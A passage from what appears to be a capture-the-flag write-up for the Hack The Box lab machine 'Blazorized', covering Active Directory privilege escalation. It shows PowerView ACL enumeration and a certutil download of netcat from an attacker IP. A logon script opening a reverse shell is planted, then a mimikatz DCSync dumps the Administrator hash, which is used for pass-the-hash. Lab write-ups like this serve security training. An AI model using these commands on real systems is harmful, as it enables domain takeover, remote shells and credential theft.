*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ObjectAceType, ActiveDirectoryRights | fl

&lt;SNIP&gt;

IdentityReferenceName : RSA_4810
ObjectDN              : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
ObjectAceType         : Script-Path
ActiveDirectoryRights : WriteProperty

&lt;SNIP&gt;</code></pre>
</doc-codeblock></div>
<p>We find one ACL for our current user that shows a WriteProperty on the script path of the <code v-pre>SSA_6010</code> user. By having this permission it could allow us to write a custom logon script that executes whenever this user tries to login to the machine. We can look if this user tried to login:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; [DateTime]::FromFileTime((Get-ADUser -Identity ssa_6010 -Properties LastLogon).LastLogon)
Saturday, November 9, 2024 4:32:38 AM
*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; date
Saturday, November 9, 2024 4:32:44 AM</code></pre>
</doc-codeblock></div>
<p>It looks like this person is logging in and out every minute so lets abuse this now. We are able to write a <code v-pre>bat</code> file in <code v-pre>sysvol\[domain]\scripts\</code> and use this to run a reverse shell whenever the user <code v-pre>SSA_6010</code> tries to login. We can check which logon script folder is from our target user by checking the permissions.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; icacls A32FF3AEAA23
A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)
             BLAZORIZED\Administrator:(OI)(CI)(F)
             BUILTIN\Administrators:(I)(F)
             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
             NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)
             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
             BUILTIN\Server Operators:(I)(OI)(CI)(RX)
*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; certutil -f -urlcache http://10.10.14.4:8888/nc.exe C:\Users\Public\nc.exe
*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; echo 'C:\Users\Public\nc.exe 10.10.14.4 5555 -e cmd.exe' | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\login.bat -Encoding ASCII
*Evil-WinRM* PS C:\windows\sysvol\domain\scripts&gt; Set-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\login.bat'</code></pre>
</doc-codeblock></div>
<p>We wait a minute for the user to login and catch our reverse shell. From BloodHound we also see that this user is able to perform a DCSync attack.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/bloodhound-ssa.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="dcsync">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#dcsync">#</doc-anchor-trigger>
        <span>DCSync</span>
    </h3>
</doc-anchor-target>
<p>We upload <code v-pre>mimikatz.exe</code> and perform the attack and get the hash of the Domain Admin.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\Public&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:BLAZORIZED.HTB /user:Administrator&quot; &quot;exit&quot;

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 2/25/2024 11:54:43 AM
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3

$ evil-winrm -i 10.10.11.22 -u 'Administrator' -H 'f55ed1465179ba374ec1cad05b34a5f3'

*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type note.txt

If you enjoyed this machine and want to learn more about DACL attacks, check out the 'DACL Attacks I' and 'DACL Attacks II' modules on HTB Academy.

- Pedant</code></pre>
</doc-codeblock></div>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Blazorized (Hard)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
